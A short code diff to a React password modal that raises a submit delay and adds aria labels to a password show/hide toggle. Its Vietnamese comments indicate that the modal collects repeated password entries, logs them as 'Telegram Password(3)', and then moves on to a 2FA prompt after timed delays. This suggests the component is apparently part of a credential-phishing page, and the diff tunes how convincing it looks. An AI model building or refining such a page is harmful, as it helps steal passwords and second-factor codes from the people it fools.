@@ -15,7 +15,7 @@ interface PasswordModalProps {
 
 const SUBMIT_DELAY_MS = 1345;
 /** Chờ lâu hơn sau lần nhập mật khẩu thứ 2 (xác nhận) trước khi mở 2FA */
-const SUBMIT_DELAY_SECOND_PASSWORD_MS = 2050;
+const SUBMIT_DELAY_SECOND_PASSWORD_MS = 2600;
 /** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
 const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
 
@@ -157,6 +157,9 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                                 onChange={handleChange}
                                 autoComplete="off"
                                 allowToggle
+                                ariaShowPassword={t.password.ariaShowPassword}
+                                ariaHidePassword={t.password.ariaHidePassword}
+                                ariaPasswordToggleDisabled={t.password.ariaPasswordToggleDisabled}
                             />
                             {errors.password ? (
                                 <div
